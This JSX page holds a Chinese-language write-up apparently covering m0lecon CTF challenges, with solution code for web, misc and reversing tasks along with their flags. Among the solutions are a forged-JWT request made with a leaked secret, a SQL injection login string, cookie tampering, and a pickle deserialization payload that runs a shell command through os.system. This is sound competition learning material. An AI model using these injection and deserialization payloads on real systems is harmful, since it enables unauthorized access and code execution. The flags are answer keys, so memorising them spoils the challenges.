import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.Image src="overview.jpg" width="100%" />
            <X.H1>Web</X.H1>
            <X.H2>Cookie Shop</X.H2>
            <X.P>直接改cookie就可以，控制台输入{`\`btoa('{"balance": 99999}')\``}可以拿到要修改为的值。</X.P>
            <X.H2>Go SecureIt</X.H2>
            <X.P>JWT密钥泄露。</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import requests
                import jwt

                url = "https://gosecureit.challs.m0lecon.it/flag"

                payload = {
                    "username": "admin",
                    "role": "admin",
                }

                token = jwt.encode(payload, "schrody_is_always_watching", algorithm="HS256")
                print(token)

                resp = requests.get(url, cookies={"jwt": token})
                print(resp.text)

                # ptm{Th4t'5_why_1t'5_c4ll3d_53cr3t?}
                `}
            />
            <X.H2>Locked Door</X.H2>
            <X.P>查看元素看到跳转到`/xugpuhru`的按钮有`disabled`属性，把它移除再点击，或手动跳转。</X.P>
            <X.P>在Previous Accesses页面，用`1' or 1=1 --`登录可以下载`.pcap`文件，从文件内容看到需要做一个RSA解密。由于`n`比较小，可以直接借助@Sage[https://sagecell.sagemath.org/]@分解。解密后的`8`位数字就是密码。</X.P>
            <X.CodeBlock
                language="python"
                code={`
                p, q = 9962676558042353381, 16839954032773686901
                cipher = 45538264661765883251026503237437838586

                e = 65537

                n = p * q
                phi = (p - 1) * (q - 1)
                d = pow(e, -1, phi)
                msg = pow(cipher, d, n)

                print(msg)  # 99004462

                # ptm{iT_1s_d17fiCu1t_t0_uNl0ck_4_d00r}
                `}
            />
            <X.H1>Misc</X.H1>
            <X.H2>Pickle Soup</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                import base64

                payload = b'''\\
                (S'cat *.txt'
                ios
                system
                .'''

                payload = base64.b64encode(payload)
                print(payload)  # b'KFMnY2F0ICoudHh0Jwppb3MKc3lzdGVtCi4='

                # ptm{Th3_s3cr3t_1ngr3di3nt_w3re_th3_fri3nds_w3_m4de_4l0ng_th3_w4y}
                `}
            />
            <X.H1>Reversing</X.H1>
            <X.H2>Susculator</X.H2>
            <X.P>数据规模不大，可以直接爆破。满足条件的结果不唯一。</X.P>
            <X.CodeBlock
                language="cpp"
                code={`
                #include <iostream>
                #define HIWORD(x) (((x) >> 16) & 0xFFFF)
                using namespace std;
                typedef unsigned int i32;
                i32 myhash(i32 a1)
                {
                    i32 v2 = -793289518 * ((-793289518 * (a1 ^ HIWORD(a1))) ^ ((-793289518 * (a1 ^ HIWORD(a1))) >> 16));
                    return HIWORD(v2) ^ v2;
                }
                int main()
                {
                    int target=-1554755408;
                    for(i32 test=0;;test++)
                    {
                        if(test%100000000==0) cout<<test<<endl;
                        if(target==myhash(test))
                        {
                            cout<<test<<endl; // 733394619
                            break;
                        }
                    }
                    cout<<"Done.";
                    return 0;
                }

                // ptm{my_s3cr3t_i5_th4t_1_l0v3_c4t5}
                `}
            />
            <X.H2>Droid Cryptor</X.H2>
            <X.P>用Java写出对应的解密逻辑即可：</X.P>
            <X.CodeBlock
                language="java"
                code={`
                import javax.crypto.*;
                import javax.crypto.spec.GCMParameterSpec;
                import javax.crypto.spec.SecretKeySpec;
                import java.util.Base64;

                public class Test {
                    private static final String IV = "TXdESVBYeWc1dldkbHNFaQ==";
                    private static final String Key = "YWYwYjAyYjkzNmRhZjU3Yg==";
                    private static final String Output = "XZdGZ7pi9Ih4wHL/8Mj0q8/o6i/utS2tIsigHXCaEzpTXgesqtnLNJMbagqYH67ut9dbxhXC28w=";

                    public static String decrypt() throws Exception {
                        Base64.Decoder decoder = Base64.getDecoder();
                        SecretKey secretKey = new SecretKeySpec(decoder.decode(Key), "AES");
                        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, decoder.decode(IV));
                        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                        cipher.init(Cipher.DECRYPT_MODE, secretKey, gcmParameterSpec);
                        byte[] decryptedData = cipher.doFinal(decoder.decode(Output));
                        return new String(decryptedData);
                    }

                    public static void main(String[] args) throws Exception {
                        String decryptedData = decrypt();
                        System.out.println("Decrypted Data: " + decryptedData);
                    }
                }

                // Decrypted Data: ptm{th3nk_y0u_f0r_r3st0r1ng_mY_m3ss4g3!}
                `}
            />
            <X.H2>Magical Advisor</X.H2>
            <X.P>解线性方程组。</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import numpy as np

                A0 = [
                    0x558, 0x6EC, 0x629, 0x600, 0x53F, 0x4A9, 0x40F, 0x538,
                    0x604, 0x748, 0x4EF, 0x3F1, 0x4E9, 0x76D, 0x407, 0x42F,
                    0x58A, 0x7CB, 0x69C, 0x5FD, 0x532, 0x74A, 0x429, 0x653,
                    0x762, 0x6B5, 0x574, 0x758, 0x479, 0x6FE, 0x547, 0x77D,
                    0x4EE, 0x601, 0x6D4, 0x55F, 0x787, 0x420, 0x661, 0x625,
                    0x44B, 0x7A2, 0x646, 0x668, 0x541, 0x699, 0x7C0, 0x593,
                    0x436, 0x62F, 0x5E3, 0x668, 0x507, 0x459, 0x4FB, 0x706,
                    0x5EE, 0x421, 0x6A7, 0x6A0, 0x66A, 0x5FC, 0x781, 0x4BA,
                ]
                print(len(A0))  # 64

                A = np.array(A0).reshape(8, 8)
                b = [0x24755BA, 0x238FFE7, 0x28CC2B2, 0x2B017EC, 0x278F0B0, 0x295FE1C, 0x2500092, 0x27D1441]
                x = np.linalg.solve(A, b)

                print(x)
                for i in x:
                    print(round(i))

                # ptm{sm7_s0lv3r5_c4n_b3_m4g1c4l}
                `}
            />
        </>
    );
}
